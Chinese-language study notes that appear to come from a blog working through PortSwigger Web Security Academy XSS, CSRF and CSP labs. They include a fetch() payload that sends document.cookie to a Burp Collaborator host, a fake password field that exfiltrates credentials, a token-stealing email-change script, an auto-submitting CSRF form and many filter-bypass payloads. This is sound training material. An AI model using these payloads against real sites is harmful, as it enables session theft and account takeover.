<li><p><code>&lt;html&gt;</code>：这是HTML文档的根元素。</p></li>
<li><p><code>&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</code>：这是一个注释，说明这段代码是由Burp
Suite Professional生成的用于漏洞利用的CSRF攻击演示。</p></li>
<li><p><code>&lt;body&gt;</code>：这是HTML文档的主体部分，包含了页面内容。</p></li>
<li><p><code>&lt;form action="https://0a7d00e0049f116f800a12ff0082002d.web-security-academy.net/my-account/change-email" method="POST"&gt;</code>：这是一个表单元素，用于构造一个POST请求，目标URL是<code>https://0a7d00e0049f116f800a12ff0082002d.web-security-academy.net/my-account/change-email</code>，这是用于修改用户邮箱的功能。</p></li>
<li><p><code>&lt;input type="hidden" name="email" value="hacker&amp;#64;evil&amp;#45;user&amp;#46;net" /&gt;</code>：这是一个隐藏的输入域，用于设置待修改的邮箱地址为<code>hacker@evil-user.net</code>。</p></li>
<li><p><code>&lt;input type="hidden" name="csrf" value="YFJA9CBLWed2lWvbngdLmaE6S8Bt3Hw4" /&gt;</code>：这是一个隐藏的输入域，用于设置CSRF令牌的值。</p></li>
<li><p><code>&lt;input type="submit" value="Submit request" /&gt;</code>：这是一个提交按钮，当用户点击时，将提交表单数据到指定的URL。</p></li>
<li><p><code>&lt;script&gt;</code>：这是一个JavaScript代码块的开始。</p></li>
<li><p><code>history.pushState('', '', '/');</code>：这是HTML5的<code>history.pushState()</code>方法，它会修改浏览器的历史记录，将当前URL改为<code>/</code>。这可能是为了在用户执行操作后不留下痕迹。</p></li>
<li><p><code>document.forms[0].submit();</code>：这行代码通过JavaScript来自动提交表单，实际触发了一个POST请求，将修改用户邮箱的请求发送到目标URL。
总的来说，这段代码是一个伪造的CSRF攻击工具，用于自动提交修改用户邮箱的请求，以利用目标网站上的CSRF漏洞。攻击者可以将这段代码嵌入到恶意页面中，当受害者访问该页面并且已经登录到目标网站时，这段代码会自动触发修改邮箱的请求，从而导致受害者的邮箱被修改。</p></li>
</ol></li>
</ol>
<h4 id="content-security-policy">Content security policy</h4>
<ol type="1">
<li><p><code>内容安全策略</code>（CSP，Content Security
Policy）是一种浏览器安全机制，旨在减轻跨站脚本（XSS）和一些其他攻击。其工作原理是通过<strong>限制</strong>页面可以加载的资源（如脚本和图像），以及限制页面是否可以被其他页面框架来实现。</p>
<p>为了启用CSP，响应需要包括一个名为<code>Content-Security-Policy</code>的HTTP响应头，其值包含策略信息。策略本身由一个或多个指令组成，用分</p>
<p>号分隔。</p></li>
</ol>
<h5
id="lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-1">Lab:
Reflected XSS protected by very strict CSP, with dangling markup
attack</h5>
<ol type="1">
<li>即上一个lab</li>
</ol>
<h5 id="lab-reflected-xss-protected-by-csp-with-csp-bypass">Lab:
Reflected XSS protected by CSP, with CSP bypass</h5>
<ol type="1">
<li><p>test <code>payload</code></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span></code></pre></li>
<li><p>抓包<img src="https://s2.loli.net/2023/08/08/fSOVpjGsCY2Hrab.png"
alt="image-20230808230158902" /></p>
<figure>
<img src="https://s2.loli.net/2023/08/08/PZYA8ezkxnp6XVm.png"
alt="image-20230808230340036" />
<figcaption aria-hidden="true">image-20230808230340036</figcaption>
</figure></li>
<li><p>payload,只能在地址栏，需要<code>URl编码</code></p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;?search&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&amp;token&#x3D;;script-src-elem &#39;unsafe-inline&#39;</code></pre></li>
<li><figure>
<img src="https://s2.loli.net/2023/08/08/tMrRmxbjAL8ZC34.png"
alt="image-20230808230506198" />
<figcaption aria-hidden="true">image-20230808230506198</figcaption>
</figure></li>
</ol>
<h4 id="how-to-prevent-xss">How to prevent XSS</h4>
<ol type="1">
<li><strong>在输出时对数据进行编码</strong>：在将数据显示在网页上之前，确保对数据进行适当的编码，以防止恶意脚本被解释和执行。不同类型的数据（文本、HTML、JavaScript等）需要不同的编码方法。</li>
<li><strong>在输入到达时验证数据</strong>：在数据到达应用程序之前，对输入数据进行验证和过滤，以确保其符合预期的格式和内容。例如，可以检查输入中是否包含恶意脚本标签。</li>
</ol>
<h3 id="cross-site-scripting">Cross-site scripting</h3>
<h4 id="exploiting-cross-site-scripting-vulnerabilities-1">Exploiting
cross-site scripting vulnerabilities</h4>
<ul>
<li><p><strong>lab-steal cookies</strong></p>
<ul>
<li><p><strong>Session 和 Cookie</strong></p>
<p>是 Web 开发中常用的两个概念，但它们之间有着本质上的不同。</p>
<p>Cookie
是一种存储在客户端浏览器中的小型文本文件，用于记录用户在访问网站时的相关信息。例如，登录凭证、购物车中的商品信息等都可以通过
Cookie 来进行记录。Cookie 可以通过设置过期时间来控制其存储的时长。</p>
<p>Session
则是指服务器与客户端之间的一种会话机制。当用户访问某个网站时，服务器会为其创建一个唯一的
Session ID，并将其存储在服务器端。客户端的浏览器会将这个 Session ID
存储在 Cookie 中，并在后续的请求中自动携带。服务器可以通过这个 Session
ID 来识别当前的用户，从而实现跨页面的数据共享。与 Cookie
不同的是，Session
数据的存储位置是在服务器端的内存或磁盘上，而非客户端浏览器中。</p>
<p>总的来说，Cookie
适合存储一些用户的持久化数据，如登录状态、购物车数据等，而 Session
更适合存储一些临时数据，如验证码、表单信息等。在实际的应用中，Cookie 和
Session 通常会结合使用，来满足不同的需求。</p></li>
</ul>
<ol type="1">
<li><p>构建一个脚本</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>	
<span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
<span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>
<span class="token literal-property property">body</span><span class="token operator">:</span>document<span class="token punctuation">.</span>cookie
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
<li><p>获取自己服务器的子域名<img
src="https://s2.loli.net/2023/04/05/CgJlEjZ6ADGdX4K.png"
alt="image-20230405162357049" /></p></li>
<li><p>在博客评论区发表评论</p></li>
<li><p>等待服务器出现结果<img
src="https://s2.loli.net/2023/04/05/eZvJHk8IcLqumhp.png"
alt="image-20230405162446313" /></p></li>
</ol></li>
<li><p><strong>lab：capture passwords</strong></p>
<p>获取用户名和密码的payload,其他同上一个lab</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input name<span class="token operator">=</span>username id<span class="token operator">=</span>username<span class="token operator">></span>
<span class="token operator">&lt;</span>input type<span class="token operator">=</span>password name<span class="token operator">=</span>password onchange<span class="token operator">=</span>"<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>
<span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>
<span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span>
<span class="token literal-property property">body</span><span class="token operator">:</span>username<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>value
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>"<span class="token operator">></span></code></pre></li>
<li><p><strong>lab:perform CSRF</strong></p>
<ol type="1">
<li>依然是利用评论区的Xss漏洞，注入如下payload</li>
</ol>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>onload <span class="token operator">=</span> handleResponse<span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span><span class="token string">'/my-account'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> token <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">name="csrf" value="(\w+)"</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> changeReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    changeReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'/my-account/change-email'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    changeReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'csrf='</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">'&amp;email=test@test.com'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<ol start="2" type="1">
<li><p>当其他用户打开这条评论时，就会执行上述的脚本，执行过程如下：</p>
<ol type="1">
<li>构造一个新的请求，发送该请求到指定url</li>
<li>设定接受到服务器响应的回调函数为handleResponse</li>
<li>当服务器返回响应，执行该回调函数
<ol type="1">
<li>提取响应报文中的token</li>
<li>提取用户账号，密码</li>
<li>使用以上信息发送一个新的请求（修改电子邮件）</li>
</ol></li>
</ol></li>
<li><p>解释：</p>
<p>通常情况下，<code>GET</code> 请求用于从服务器获取资源，而
<code>POST</code>
请求用于向服务器提交数据并请求操作，比如创建、更新或删除资源。在这种情况下，第一次请求用于获取用户的
CSRF token，不需要提交任何数据，因此使用 GET
请求即可。第二次请求用于提交修改用户邮箱地址的请求，需要将新的邮箱地址和
CSRF token 一起提交给服务器，因此使用 POST 请求方式。</p>
<p>需要注意的是，CSRF token
的获取和使用必须在同一个域名下进行，否则由于跨域限制，无法获取到 token
或者无法使用 token 进行攻击。</p></li>
</ol></li>
</ul>
<h4 id="cross-site-scripting-xss-cheat-sheet">Cross-site scripting (XSS)
cheat sheet</h4>
<ul>
<li><p><strong>Lab: Reflected XSS into HTML context with most tags and
attributes blocked</strong></p>
<p>key words:<code>reflected XSS</code>,<code>blocked</code></p>
<ol type="1">
<li><p>随便用一个payload测试<img
src="https://s2.loli.net/2023/04/07/v5i3ZQO7aTyrJqd.png"
alt="image-20230407001101034" /></p></li>
<li><p>tag入侵<img
src="https://s2.loli.net/2023/04/07/gG1eXVcb3N7FT2D.png"
alt="image-20230407001352435" /></p></li>
<li><p>结果<img src="https://s2.loli.net/2023/04/07/gG1eXVcb3N7FT2D.png"
alt="none" /></p></li>
<li><p>同理测试event<img
src="https://s2.loli.net/2023/04/07/M1YFH7r6pOxgWBL.png"
alt="image-20230407001954896" /></p>
<p>result: <img src="https://s2.loli.net/2023/04/07/GsjKVnENAdpfICU.png"
alt="image-20230407002042334" /></p></li>
<li><p>最终payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onresize</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>" onload=this.style.width='100px'>
    
// YOUR-LAB-ID: 博客主页面ID
    </code></pre>
<p>解析：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onresize</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>"  onload=this.style.width='100px'> </code></pre>
<p>是一个HTML标签，用于在当前页面中创建一个内联框架，允许嵌入另一个网页。<code>src="[https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E]</code>(https://YOUR-LAB-ID.web-security-academy.net/?search="&gt;)"
是iframe标签的src属性，指定要在内联框架中加载的页面的URL。URL包括一个搜索查询参数（search），值为"&gt;后跟<code>&lt;body onresize=print()&gt;</code>。这是一个URL编码的字符串，表示要注入到易受攻击的网站搜索字段中的HTML代码。%22：这是双引号（"）字符的URL编码表示。</p>
<p>%3E：这是大于号（&gt;）字符的URL编码表示。</p>
<p>%3C：这是小于号（&lt;）字符的URL编码表示。</p>
<p>%20：这是空格字符的URL编码表示。</p>
<p>onresize=print()：这是附加到注入HTML代码的body标签的事件属性。它指定当触发onresize事件（例如当浏览器窗口大小调整）时，应执行print（）函数。print（）函数打开浏览器的打印对话框，可用于各种目的，如钓鱼或分散注意力的技术。</p>
<p>onload=this.style.width='100px'：这是附加到iframe标签本身的另一个事件属性。它指定当触发onload事件（例如当iframe加载完成）时，iframe的宽度CSS属性应设置为100px。这是为了使注入的body标签不太明显，因为它会被缩小到一个非常小的大小。</p></li>
</ol></li>
<li><p><strong>Lab: Reflected XSS into HTML context with all tags
blocked except custom ones</strong></p>
<ol type="1">
<li><p>先理解题目，同上注入payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1>#x'</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<p>解析：这段代码是一个 JavaScript 脚本，它将浏览器重定向到一个
URL。在这个 URL 中，有一个包含 XSS 攻击负载的查询字符串参数
search。这个查询字符串参数包含一个自定义标签 <code>&lt;xss id=x</code>
<code>onfocus=alert(document.cookie) tabindex=1&gt;</code>，其中 id
属性的值为 x，onfocus 事件处理程序的值是一个弹出文档 cookie 的
JavaScript 脚本。最后的 #x 是一个 URL
锚点，它指定了在加载页面时要聚焦的元素的 ID，即这里的 x
元素。因此，当页面加载时，x 元素获得焦点，onfocus 事件被触发，导致
JavaScript 弹出文档 cookie 的值。整个代码的目的是演示如何利用 XSS
漏洞来窃取用户的敏感信息。</p></li>
</ol></li>
</ul>
<p>​ <strong>疑问：</strong> 使用 exploit server 存储和传递XSS
Payload给受害者浏览器</p>
<ul>
<li><p><strong>Lab: Reflected XSS with event handlers and
<code>href</code> attributes blocked</strong></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token constant">YOUR</span><span class="token operator">-</span><span class="token constant">LAB</span><span class="token operator">-</span><span class="token constant">ID</span><span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>a<span class="token operator">></span><span class="token operator">&lt;</span>animate attributeName<span class="token operator">=</span>href values<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>text x<span class="token operator">=</span><span class="token number">20</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token operator">></span>Click me<span class="token operator">&lt;</span><span class="token operator">/</span>text<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> </code></pre>
<ul>
<li>https://YOUR-LAB-ID.web-security-academy.net/：这是一个 URL，其中
YOUR-LAB-ID 是实验室的 ID，它用于访问 Web
安全学院的网络安全实验室。</li>
<li>?search=：这是一个查询参数，用于将搜索词传递给 Web 应用程序。在此
URL 中，它的值为
<code>&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</code>，这是一个包含
SVG 元素和 JavaScript 代码的字符串。</li>
<li><code>&lt;svg&gt;</code>：这是 SVG（Scalable Vector
Graphics）元素，用于定义矢量图形。</li>
<li><code>&lt;a&gt;</code>：这是超链接元素，用于在文档中创建链接。</li>
<li><code>&lt;animate&gt;</code>：这是 SVG 动画元素，用于为 SVG
元素添加动画效果。</li>
<li>attributeName=href：这是 animate
元素的属性之一，指定要在动画期间更改的属性。在此 URL 中，href
属性是目标。</li>
<li>values=javascript:alert(1)：这是 animate
元素的属性之一，指定在动画期间要更改目标属性的值。在此 URL
中，它包含一个 JavaScript 弹出窗口警告框，显示数字 1。</li>
<li><code>&lt;text&gt;</code>：这是 SVG 文本元素，用于在 SVG
中添加文本。</li>
<li>x=20 y=20：这些是 text 元素的属性之一，指定文本在 SVG
中的位置。</li>
<li>Click me：这是 text 元素中包含的文本。</li>
</ul></li>
<li><p><strong>Lab: Reflected XSS with some SVG markup
allowed</strong></p>
<ol type="1">
<li><p>burp-intruder,检测未被屏蔽的tag和event</p></li>
<li><p>最终payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>0a3d009d038e2c338158e8e4009f00e6<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform onbegin<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre></li>
</ol></li>
<li><p><strong>XSS in HTML tag attributes</strong></p>
<ol type="1">
<li><strong>示例1：</strong>假设存在以下HTML代码：</li>
</ol>
<pre class="language-markup" data-language="markup"><code class="language-markup">graphql
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
<p>在这个情况下，我们想要在value属性中插入一个XSS
payload，来触发一个弹窗。</p>
<p>我们可以试图在value属性中插入一个完整的script标签，但是由于双引号的存在，我们无法将整个标签放入value属性中。</p>
<p>但是，我们可以在双引号后面插入一个空格，从而“终止”value属性，然后添加一个新的属性，用于触发XSS
payload。如下所示：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">php
"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
<p>这将使得HTML标签变成如下的形式：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">php
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
<p>这样一来，我们就成功地将XSS payload
插入到HTML标签的属性中，达到了攻击的目的。当用户访问这个页面并点击搜索框时，将会触发这个XSS
payload，弹出一个提示框，显示当前</p>
<ol start="2" type="1">
<li><p><strong>示例2</strong>：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">" autofocus onfocus=alert(document.domain) x="</span></code></pre></li>
</ol></li>
<li><p><strong>Lab: Stored XSS into anchor <code>href</code> attribute
with double quotes HTML-encoded</strong></p>
<ol type="1">
<li>href 属性的利用：注入 <code>javascript:alert(1)</code><img
src="https://s2.loli.net/2023/04/09/xHsLoVQD8tu62SB.png"
alt="image-20230409152554775" /></li>
</ol></li>
<li><p><strong>Lab: Reflected XSS in canonical link tag</strong></p>
<ul>
<li><p>payload:<strong>组合键</strong>触发JS</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>0ad9009804850975818a2f6e000f002c<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span><span class="token string">'accesskey='</span>x<span class="token string">'onclick='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre></li>
</ul></li>
<li><p><strong>Lab: Reflected XSS into a JavaScript string with single
quote and backslash escaped</strong></p>
<ul>
<li><p>因为输入含有单引号的字符串，单引号会被转义，所以判断这个输入框是被JS解析的</p></li>
<li><p>因此构造payload 提前结束JS，并在后面添加自己的JS,Payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li>
</ul></li>
<li><p><strong>Reflected XSS into a JavaScript string with angle
brackets HTML encoded</strong></p>
<p>这题像经典的sql注入</p>
<ol type="1">
<li><p>首先可以在搜索框加入引号闭合字符串试探</p></li>
<li><p>最后使用这个payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'-alert(1)-'</span></code></pre>
<hr />
<p><strong>横杠</strong><code>-</code>的解释：</p>
<p>在某些情况下，需要使用横杠来打破字符串的闭合，从而能够注入其他代码，例如在某些字符串拼接的场景中。这是因为如果不使用横杠，输入的有效载荷可能会被视为字符串的一部分而不是注入代码。例如，假设我们要在以下字符串中注入有效载荷：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">csharpCopy code
<span class="token keyword">var</span> search <span class="token operator">=</span> <span class="token string">'search string: '</span> <span class="token operator">+</span> user_input<span class="token punctuation">;</span></code></pre>
<p>如果直接将有效载荷 <code>alert(1)</code> 放在 <code>user_input</code>
变量中，则字符串将变成：</p>
<pre class="language-none"><code class="language-none">csharpCopy code
var search &#x3D; &#39;search string: alert(1)&#39;;</code></pre>
<p>在这种情况下，注入的有效载荷将被视为字符串的一部分，而不是要执行的JavaScript代码。为了打破字符串的闭合，我们可以使用横杠将有效载荷包装起来，例如：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">csharpCopy code
<span class="token keyword">var</span> search <span class="token operator">=</span> <span class="token string">'search string: '</span> <span class="token operator">+</span> <span class="token string">'-alert(1)-'</span><span class="token punctuation">;</span></code></pre>
<p>这将打破了字符串的闭合，注入的有效载荷现在可以作为JavaScript代码执行。</p>
<p>然而，并非所有情况都需要使用横杠。例如，当注入点不在字符串拼接的位置时，横杠可能不是必需的。在这种情况下，注入的有效载荷可以直接放置在JavaScript代码中。因此，在注入有效载荷时，需要根据上下文进行判断是否需要使用横杠。</p>
<hr />
<p><strong>观察响应</strong>，每次引号闭合都有 <code>;</code>结束<img
src="https://s2.loli.net/2023/04/10/OX8bRh19stvnTfQ.png"
alt="image-20230410023540225" /></p></li>
</ol></li>
<li><p><strong>Lab: Reflected XSS into a JavaScript string with angle
brackets and double quotes HTML-encoded and single quotes
escaped</strong></p>
<p>原理：引号会被添加反斜杠解析成纯字符，而不是jS中的字符串结束符号，而在payload中的引号前手动加上,那么引号就不会被解析成纯文本。</p>
<ol type="1">
<li><p>使用 <code>abcd'1234</code>,观察</p></li>
<li><p>最终payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">\<span class="token string">'alert('</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token comment">//</span></code></pre></li>
</ol></li>
<li><p><strong>Reflected XSS in a JavaScript URL with some characters
blocked</strong></p>
<p><a
target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-parentheses-and-semi-colons">XSS
without parentheses and semi-colons</a></p>
<ol type="1">
<li><p>payload</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token constant">YOUR</span><span class="token operator">-</span><span class="token constant">LAB</span><span class="token operator">-</span><span class="token constant">ID</span><span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span>post<span class="token operator">?</span>postId<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>x<span class="token operator">=</span>x<span class="token operator">=</span><span class="token operator">%</span>3E<span class="token punctuation">&#123;</span><span class="token keyword">throw</span><span class="token comment">/**/</span>onerror<span class="token operator">=</span>alert<span class="token punctuation">,</span><span class="token number">1337</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>toString<span class="token operator">=</span>x<span class="token punctuation">,</span>window<span class="token operator">%</span>2b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token operator">%</span><span class="token number">27</span></code></pre>
<p><strong>解析：</strong></p>
<p>这个攻击利用了异常处理的机制，通过 throw
语句触发异常，然后在异常处理函数中调用 alert
函数，并传入参数。利用了箭头函数创建一个代码块，以便使用 throw
语句。为了调用这个函数，我们需要将它分配给 window 对象的 toString
属性，并通过强制将 window 对象转换为字符串来触发它。这个攻击会成功，但是
alert 只有在点击页面底部的“返回博客”后才会触发。</p>
<ol type="1">
<li><code>postId=5&amp;%27&#125;</code>：将postId设置为5，这是URL中的有效查询参数。</li>
<li><code>,x=x=%3E&#123;throw/**/onerror=alert,1337&#125;</code>：这里使用了一个箭头函数
<code>x=x=&gt;&#123;&#125;</code>，并通过throw语句来抛出异常。throw语句会在执行时立即停止函数的运行，并把控制权交给其父级调用函数。在这种情况下，它会触发一个异常并将其传递给onerror处理程序。通过在throw语句中使用一个注释，它可以避免不允许在URL中使用空格的限制。</li>
<li><code>,toString=x</code>：使用toString()方法将x函数转换为字符串。</li>
